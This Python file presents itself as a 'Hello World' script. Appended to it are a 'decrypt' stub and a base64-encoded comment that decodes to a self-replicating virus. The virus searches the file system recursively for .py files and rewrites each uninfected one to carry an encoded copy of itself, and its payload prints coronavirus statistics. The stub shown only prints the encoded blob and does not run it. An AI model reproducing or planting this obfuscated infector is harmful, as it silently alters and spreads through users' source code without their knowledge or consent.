print("Hello World!")
### E & D START ###
import glob,sys,re,base64,json,COVID19Py
def decrypt():
    isInfectedFile = True
    with open(sys.argv[0],"r") as fh:
        lines = fh.readlines()
        
        for line in lines:
            if(line.startswith("### -_- VIRUS -_- ###")):
                isInfectedFile = False
    
    if(isInfectedFile):
        print("Here")
        with open(sys.argv[0],"r") as fh:
            lines = fh.readlines()
            flag = False
            encryptedCode = str()
            for line in lines:
                if(flag):
                    encryptedCode = line[1:]

                if(line.startswith("### E & D  END ###")):
                    flag = True

                if(encryptedCode):
                    print(encryptedCode) 
                    return encryptedCode
    else:
        return 

decrypt()
### E & D  END ###
#IyMjIC1fLSBWSVJVUyAtXy0gIyMjCgoKIyMjIElORkVDVElPTiBWRUNUT1IgIyMjCgpkZWYgZ2V0RUQoKTogIyBnZXQgZW5jcnlwdCBhbmQgZGVjcnlwdCBwYXJ0CiAgICBlZENvZGUgPSBbXQogICAgZmlsZUhhbmRsZXIgPSBvcGVuKHN5cy5hcmd2WzBdLCJyIikKICAgIGxpbmVzID0gZmlsZUhhbmRsZXIucmVhZGxpbmVzKCkKICAgIGFwcGVuZCA9IEZhbHNlCiAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICBpZihsaW5lLnN0YXJ0c3dpdGgoIiMjIyBFICYgRCBTVEFSVCAjIyMiKSk6CiAgICAgICAgICAgIGFwcGVuZCA9IFRydWUKICAgICAgICBpZihhcHBlbmQpOgogICAgICAgICAgICBlZENvZGUuYXBwZW5kKGxpbmUpCiAgICAgICAgCiAgICAgICAgaWYobGluZS5zdGFydHN3aXRoKCIjIyMgRSAmIEQgIEVORCAjIyMiKSk6CiAgICAgICAgICAgIGFwcGVuZCA9IEZhbHNlCiAgICByZXR1cm4gZWRDb2RlCgpkZWYgZ2V0VmlydXNDb2RlKCk6CiAgICB2aXJ1c0NvZGUgPSBbXQogICAgZmlsZUhhbmRsZXIgPSBvcGVuKHN5cy5hcmd2WzBdLCJyIikKICAgIGxpbmVzID0gZmlsZUhhbmRsZXIucmVhZGxpbmVzKCkKICAgIGFwcGVuZCA9IFRydWUKICAgIGZvciBsaW5lIGluIGxpbmVzOgogICAgICAgIGlmKGxpbmUuc3RhcnRzd2l0aCgiIyMjIEUgJiBEIFNUQVJUICMjIyIpKToKICAgICAgICAgICAgYXBwZW5kID0gRmFsc2UKICAgICAgICBpZihhcHBlbmQpOgogICAgICAgICAgICB2aXJ1c0NvZGUuYXBwZW5kKGxpbmUpCiAgICAgICAgCiAgICAgICAgaWYobGluZS5zdGFydHN3aXRoKCIjIyMgRSAmIEQgIEVORCAjIyMiKSk6CiAgICAgICAgICAgIGFwcGVuZCA9IFRydWUKICAgIHJldHVybiB2aXJ1c0NvZGUKCmRlZiBmaW5kX3ZpY3RpbXMoKToKICAgIHJldHVybiBnbG9iLmdsb2IoIioqLyoucHkiLHJlY3Vyc2l2ZT1UcnVlKQoKZGVmIGluZmVjdFZpcnVzKCk6CiAgICB2aWN0aW1zID0gZmluZF92aWN0aW1zKCkKICAgIHZpY3RpbXMucmVtb3ZlKHN5cy5hcmd2WzBdKQogICAgZm9yIHZpY3RpbSBpbiB2aWN0aW1zOgogICAgICAgIHdpdGggb3Blbih2aWN0aW0sInIiKSBhcyBmaDoKICAgICAgICAgICAgY29kZUxpbmVzID0gZmgucmVhZGxpbmVzKCkKICAgICAgICB3aXRoIG9wZW4odmljdGltLCJyIikgYXMgZmg6CiAgICAgICAgICAgIHByb2dyYW1Db2RlID0gZmgucmVhZCgpCgogICAgICAgIGluZmVjdGVkID0gRmFsc2UKICAgICAgICBmb3IgY29kZUxpbmUgaW4gY29kZUxpbmVzOgogICAgICAgICAgICBpZigiIyMjIEUgJiBEIFNUQVJUICMjIyIgaW4gY29kZUxpbmUpOgogICAgICAgICAgICAgICAgaW5mZWN0ZWQgPSBUcnVlCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgIAogICAgICAgIGlmIG5vdCBpbmZlY3RlZDoKICAgICAgICAgICAgbmV3Q29kZSA9IFtdCiAgICAgICAgICAgIG5ld0NvZGUuZXh0ZW5kKHByb2dyYW1Db2RlICsgIlxuIikKCiAgICAgICAgICAgIG5ld0NvZGUuZXh0ZW5kKGdldEVEKCkpCgogICAgICAgICAgICB2aXJ1c0NvZGUgPSBzdHIoKQogICAgICAgICAgICBsaW5lcyA9IGdldFZpcnVzQ29kZSgpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGxpbmVzOgogICAgICAgICAgICAgICAgdmlydXNDb2RlID0gdmlydXNDb2RlICsgbGluZQogICAgICAgICAgICAKICAgICAgICAgICAgZW5jcnlwdGVkVmlydXNDb2RlID0gYmFzZTY0LmI2NGVuY29kZSh2aXJ1c0NvZGUuZW5jb2RlKCJ1dGYtOCIpKQoKICAgICAgICAgICAgbmV3Q29kZS5leHRlbmQoIiMiICsgZW5jcnlwdGVkVmlydXNDb2RlLmRlY29kZSgidXRmLTgiKSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGZpbGVIYW5kbGVyID0gb3Blbih2aWN0aW0sInciKQogICAgICAgICAgICBmaWxlSGFuZGxlci53cml0ZWxpbmVzKG5ld0NvZGUpCiAgICAgICAgICAgIGZpbGVIYW5kbGVyLmNsb3NlKCkgCgojIyMgVFJJR0dFUiAjIyMKZGVmIHRyaWdnZXIoKToKICAgIHBheWxvYWQoKQoKIyMjIFBBWUxPQUQgIyMjCmRlZiBnZXRDb3ZpZElORk8oKToKICAgIGNvdmlkMTkgPSBDT1ZJRDE5UHkuQ09WSUQxOSgpCiAgICBsb2NhdGlvbnMgPSBjb3ZpZDE5LmdldExvY2F0aW9ucyhyYW5rX2J5PSdjb25maXJtZWQnKQogICAgcHJpbnQoIlRvcC0xMCBjb3VudHJpZXMgd2l0aCBoaWdoZXN0IGNvcm9uYXZpcnVzIGluZmVjdGlvbnM6ICIpCiAgICBmb3IgaSBpbiByYW5nZSgxMCk6CiAgICAgICAgcHJpbnQobG9jYXRpb25zW2ldWydjb3VudHJ5J10gKyAiICIgKyBzdHIobG9jYXRpb25zW2ldWydsYXRlc3QnXVsnY29uZmlybWVkJ10pKQogICAgICAgIGkrPTEKCmRlZiBwYXlsb2FkKCk6CiAgICBnZXRDb3ZpZElORk8oKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGluZmVjdFZpcnVzKCkKICAgIHRyaWdnZXIoKQoKIyMjIC1fLSBWSVJVUyBFTkQgLV8tICMjIw==